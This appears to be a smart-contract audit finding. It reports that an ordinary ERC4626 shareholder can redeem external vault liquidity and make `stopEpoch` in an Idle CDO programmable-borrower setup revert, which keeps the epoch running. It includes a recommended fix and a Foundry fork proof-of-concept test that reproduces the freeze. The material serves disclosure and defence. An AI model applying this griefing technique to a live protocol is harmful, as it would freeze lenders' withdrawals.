### Title
Unwithdrawable ERC4626 liquidity can keep a programmable epoch running past its deadline - (File: `contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary
In programmable-borrower mode, `stopEpoch` asks `ProgrammableBorrower.onStopEpoch` to supply the underlying needed for pending withdrawals before the epoch can be closed. [1](#0-0) 

If the borrower’s ERC4626 shares nominally cover the shortfall but the actual vault withdrawal fails, `onStopEpoch` reverts instead of returning `false` or entering the default path. [2](#0-1) 

An unprivileged ERC4626 shareholder can redeem available vault liquidity after a CDO withdrawal request is created, causing every `stopEpoch` retry to revert while liquidity remains below the required amount. [3](#0-2) 

### Finding Description
During the buffer phase, a lender calling `IdleCDOEpochVariant.requestWithdraw` creates a pending receipt and increases `IdleCreditVault.pendingWithdraws`. [3](#0-2) 

After `epochEndDate`, `stopEpoch` calls `onStopEpoch` with the pending withdrawal amount before it marks the epoch stopped. [1](#0-0) 

`ProgrammableBorrower` compares the cash shortfall with `convertToAssets`-style share value; when the shares are economically sufficient, it attempts `vault.withdraw`. [4](#0-3) 

A shareholder of the external ERC4626 vault can perform an ordinary redemption that leaves actual vault liquidity lower than the CDO’s pending withdrawal requirement, while the programmable borrower’s shares still nominally cover that requirement. [4](#0-3) 

The failed withdrawal is converted into `StopEpochVaultLiquidityUnavailable`, so the entire `stopEpoch` transaction reverts and `isEpochRunning` is never cleared. [5](#0-4) [6](#0-5) 

This is not a one-time failure: every manager retry follows the same path and reverts for as long as ERC4626 liquidity remains insufficient. [2](#0-1) 

### Impact Explanation
The broken invariant is timely epoch settlement: a vault can be economically covered according to share value but operationally unable to produce the underlying required by pending withdrawals. [2](#0-1) 

While the transaction remains unable to complete, `isEpochRunning` stays true and normal withdrawal requests remain disabled by the epoch state established in `startEpoch`. [7](#0-6) 

For example, with 10 million units of active NAV and 1 million units in `pendingWithdraws`, a vault shareholder can temporarily freeze the 1 million pending claims and prevent the remaining 10 million active NAV from reaching the buffer phase where new withdrawal requests become available. [3](#0-2) [7](#0-6) 

The attacker does not need to steal liquidity permanently; maintaining a shortage of withdrawable ERC4626 cash is sufficient to repeatedly block epoch settlement. [2](#0-1) 

### Likelihood Explanation
The attack requires only an ordinary ERC4626 vault user holding enough shares to reduce withdrawable liquidity below `pendingWithdraws`, plus an existing withdrawal request or a close-pool stop that needs underlying liquidity. [3](#0-2) [4](#0-3) 

No privileged role is involved because the malicious action is a normal `withdraw` against the external vault, while the CDO-side `stopEpoch` caller remains the honest manager. [8](#0-7) [5](#0-4) 

The duration is bounded by external vault liquidity rather than by a CDO retry limit, so the freeze may last beyond one failed transaction and potentially for an extended period if the vault remains illiquid. [2](#0-1) 

### Recommendation
Do not leave covered-but-unwithdrawable ERC4626 liquidity failures retryable forever. [5](#0-4) 

Record the first `StopEpochVaultLiquidityUnavailable` timestamp and provide a bounded grace period after `epochEndDate`; after that deadline, allow the manager to invoke a terminal path that treats the withdrawal failure as a borrower-side default or otherwise closes the epoch under an explicit loss/default policy. [9](#0-8) 

This preserves retries for genuinely transient ERC4626 failures while preventing a routine vault redemption from imposing an unbounded running-epoch state. [2](#0-1) 

### Proof of Concept
The following Foundry fork PoC belongs in `test/foundry/ProgrammableBorrowerCreditVault.sol` and uses the existing programmable-borrower fixture:

```solidity
function testPoC_ERC4626DepositorBlocksStopEpoch() external {
    _setUpProgrammableBorrowerCreditVault(
        GAUNTLET_FORK_BLOCK,
        GAUNTLET_USDC_PRIME
    );

    IERC4626 externalVault = IERC4626(GAUNTLET_USDC_PRIME);
    address vaultLp = makeAddr("external-vault-lp");
    uint256 vaultLpSeed = 10_000_000 * oneScale;

    // The attacker is an ordinary ERC4626 depositor.
    deal(USDC, vaultLp, vaultLpSeed);
    vm.startPrank(vaultLp);
    IERC20(USDC).approve(address(externalVault), vaultLpSeed);
    externalVault.deposit(vaultLpSeed, vaultLp);
    vm.stopPrank();

    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);

    uint256 depositAmount = 10_000 * oneScale;
    idleCDO.depositAA(depositAmount);

    // Create a real pending withdrawal that stopEpoch must source.
    uint256 pendingAmount = cdoEpoch.requestWithdraw(
        aaTranche.balanceOf(address(this)) / 10,
        address(aaTranche)
    );
    assertGt(pendingAmount, 0);
    assertEq(strategy.pendingWithdraws(), pendingAmount);

    _startEpochAndCheckPrices(0);
    vm.warp(cdoEpoch.epochEndDate() + 1);

    // The external-vault LP drains its withdrawable liquidity before stopEpoch.
    vm.prank(vaultLp);
    externalVault.withdraw(
        externalVault.maxWithdraw(vaultLp),
        vaultLp,
        vaultLp
    );

    // Nominal share value still covers the CDO shortfall, so the hook takes the
    // withdraw path rather than the insufficient-value/default path.
    assertGt(
        externalVault.convertToAssets(
            externalVault.balanceOf(address(programmableBorrower))
        ),
        pendingAmount
    );

    // The actual withdrawal can no longer provide the required underlying.
    vm.expectRevert();
    vm.prank(address(programmableBorrower));
    externalVault.withdraw(
        pendingAmount,
        address(programmableBorrower),
        address(programmableBorrower)
    );

    // stopEpoch bubbles the hook revert and leaves the epoch running.
    vm.expectRevert(StopEpochVaultLiquidityUnavailable.selector);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    assertTrue(cdoEpoch.isEpochRunning(), "epoch should remain running");
    assertFalse(cdoEpoch.defaulted(), "liquidity failure must not default");
    assertEq(
        strategy.pendingWithdraws(),
        pendingAmount,
        "pending withdrawal remains unfunded"
    );

    // A second honest-manager retry follows the same path while liquidity is absent.
    vm.expectRevert(StopEpochVaultLiquidityUnavailable.selector);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);
}
```
